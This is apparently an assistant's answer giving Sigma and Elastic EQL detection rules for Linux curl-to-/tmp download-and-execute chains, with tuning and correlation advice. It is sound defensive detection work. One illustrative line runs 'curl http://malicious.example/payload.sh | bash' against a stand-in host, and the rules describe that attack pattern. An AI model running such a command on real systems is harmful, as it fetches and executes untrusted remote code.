I’m providing:

1. A **Sigma rule** for Linux/Sysmon-style telemetry.
2. An **Elastic EQL sequence rule** if you need strict ordering.
3. Tuning notes.

---

## 1. Sigma Rule: Linux Download-and-Execute via Curl to /tmp and Bash

```yaml
title: Malicious Bash Script Downloaded by Curl and Executed From /tmp
id: 4f7e9f17-b8c2-4c5f-8d7d-024f6f3d5d21
status: experimental
description: >
  Detects a curl process downloading or writing a bash script to /tmp, followed by
  bash executing a script from /tmp. This may indicate malware using a classic
  Linux download-and-execute delivery chain.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
author: Detection Engineering
date: 2025-01-01
platform: linux
logsource:
  product: linux
  service: sysmon

detection:
  selection_file_download:
    EventID: 11
    Image|endswith:
      - '/curl'
    TargetFilename|startswith:
      - '/tmp/'
    TargetFilename|endswith:
      - '.sh'
      - '.bash'

  selection_process_download:
    EventID: 1
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - 'http'
      - '/tmp/'
      - '.sh'

  selection_bash_execution:
    EventID: 1
    Image|endswith:
      - '/bash'
      # Optionally include '/sh' if you want broader shell execution coverage:
      # - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  # Optional: catches relative execution such as "bash ./installer.sh" from /tmp.
  # Requires CurrentDirectory to be collected in your telemetry.
  selection_bash_execution_relative:
    EventID: 1
    Image|endswith:
      - '/bash'
    CommandLine|contains|all:
      - './'
      - '.sh'
    CurrentDirectory|startswith:
      - '/tmp/'

  condition: (selection_file_download or selection_process_download) and (selection_bash_execution or selection_bash_execution_relative)

timeframe: 1h

falsepositives:
  - Legitimate software installers that download scripts to /tmp and execute them.
  - CI/CD pipelines, container build steps, Ansible, Puppet, Salt, Cloud-Init, or packaging tools.
  - Admin or developer workflows using curl to fetch scripts for local execution.

level: high

tags:
  - attack.command-and-control
  - attack.t1105
  - attack.execution
  - attack.t1059.004
```

### Notes on the Sigma rule

- `EventID: 11` assumes Linux Sysmon file creation/modification events are available.
- `EventID: 1` assumes Linux Sysmon process creation events are available.
- The rule intentionally checks for:
  - `curl`
  - `/tmp/`
  - `.sh` or `.bash`
  - later execution by `bash`
- If your SIEM does not support temporal correlation through `timeframe`, implement this as a two-event correlation rule in the SIEM.
- To improve accuracy, correlate the same host and normalized script filename/path, for example `/tmp/payload.sh`.

---

## 2. Elastic EQL Rule: Strict Curl Download to /tmp Then Bash Execution

Use this if your detection platform supports EQL sequences, such as Elastic Security.

### Preferred version using file events + process events

```eql
sequence by host.id with maxspan=1h
  [
    file where event.action != "access"
      and event.action != "delete"
      and event.action != "rename"
      and file.path : "/tmp/*.sh"
      and (
        process.name == "curl"
        or process.parent.name == "curl"
        or process.args : ("*-o*", "*--output*")
      )
  ]
  [
    process where event.action == "start"
      and process.name : ("bash", "sh")
      and process.args != null
      and process.args : "*.sh"
      and (
        process.args : "*/tmp/*.sh*"
        or process.working_directory : "/tmp/*"
      )
      and not process.args : "*/var/tmp/*"
      and not process.working_directory : "*/var/tmp*"
  ]
```

### Process-only fallback if file events are unavailable

```eql
sequence by host.id with maxspan=1h
  [
    process where event.action == "start"
      and process.name == "curl"
      and process.args != null
      and process.args : ("*http*", "*https*")
      and process.args : ("*-o*", "*--output*")
      and process.args : "*/tmp/*.sh*"
  ]
  [
    process where event.action == "start"
      and process.name : ("bash", "sh")
      and process.args != null
      and process.args : "*.sh"
      and (
        process.args : "*/tmp/*.sh*"
        or process.working_directory : "/tmp/*"
      )
      and not process.args : "*/var/tmp/*"
      and not process.working_directory : "*/var/tmp*"
  ]
```

### What this EQL rule does

- First event:
  - Detects `curl` writing or downloading something that appears to be a shell script under `/tmp`.
  - Uses file creation if available, otherwise uses `curl` command-line indicators.
- Second event:
  - Detects `bash` or optionally `sh` executing a `.sh` script located in `/tmp`.
- `with maxspan=1h` enforces that the download happens before or within a short window before execution.

---

## 3. Optional Variant: Direct `curl | bash`

The requested rule focuses on scripts written to `/tmp`, but the following variant detects a closely related pattern:

```bash
curl http://malicious.example/payload.sh | bash
```

Elastic EQL example:

```eql
sequence by host.id with maxspan=1h
  [
    process where event.action == "start"
      and process.name == "curl"
      and process.args != null
      and process.args : ("*http*", "*https*")
  ]
  [
    process where event.action == "start"
      and process.name : ("bash", "sh")
      and process.args != null
      and process.args : ("*http*", "*https*")
  ]
```

This is noisier than the `/tmp` download-and-execute rule because legitimate admin tools frequently use `curl | bash`.

---

## 4. Recommended Tuning

To reduce false positives, consider adding exclusions for trusted parent processes or trusted execution contexts.

### Sigma exclusions example

```yaml
filter_exclude_parent_processes:
  EventID: 1
  ParentImage|endswith:
    - '/apt-get'
    - '/dpkg'
    - '/pip'
    - '/pip3'
    - '/ansible-pull'
    - '/puppet'
    - '/salt-call'
    - '/git'
    - '/docker'
    - '/dockerd'
    - '/kubelet'
    - '/java'

filter_exclude_trusted_commands:
  Image|endswith:
    - '/bash'
  CommandLine|contains:
    - '/usr/local/bin/'
    - '/usr/share/'
    - '/opt/'

condition: (selection_file_download or selection_process_download) and (selection_bash_execution or selection_bash_execution_relative) and not filter_exclude_parent_processes and not filter_exclude_trusted_commands
```

Only apply exclusions after baselining your environment. Many malicious installers intentionally abuse legitimate package managers or automation tools, so overly broad exclusions can create blind spots.

---

## 5. High-Value Correlation Improvements

If you can normalize fields in your SIEM, correlate on:

```text
host.id + script_path + user.id
```

where `script_path` is extracted from either:

- `/tmp/payload.sh`
- `bash /tmp/payload.sh`
- `sh /tmp/payload.sh`
- `./payload.sh` with working directory `/tmp`
- `TargetFilename` from file creation events

A more mature rule would look like:

```text
Event 1: curl wrote or downloaded script_path in /tmp
Event 2: bash executed same script_path within 3600 seconds
Group: host.id, user.id, script_path
```

This reduces the chance of unrelated curl writes and unrelated bash executions being correlated together.
